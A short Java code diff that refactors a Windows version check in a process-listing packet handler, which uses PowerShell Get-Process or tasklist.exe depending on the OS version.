@@ -63,7 +63,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 			WindowsOperatingSystem wos = (WindowsOperatingSystem) OperatingSystem.getOperatingSystem();
 			WindowsVersion version = wos.getVersion();
 
-			if (version.ordinal() >= WindowsVersion.WINVISTA.ordinal()) {
+			if (version == WindowsVersion.WINVISTA || version.isNewer(WindowsVersion.WINVISTA)) {
 				p = Runtime.getRuntime().exec(new String[] { "powershell", "Get-Process * | Format-Table -Property name,id,privatememorysize64,path -AutoSize" });
 			} else {
 				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
@@ -86,7 +86,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 			WindowsOperatingSystem wos = (WindowsOperatingSystem) OperatingSystem.getOperatingSystem();
 			WindowsVersion version = wos.getVersion();
 			
-			if (version.ordinal() >= WindowsVersion.WINVISTA.ordinal()) {
+			if (version == WindowsVersion.WINVISTA || version.isNewer(WindowsVersion.WINVISTA)) {
 				line = line.replaceAll("( )+", " ");
 				String[] sline = line.split(" ");
 
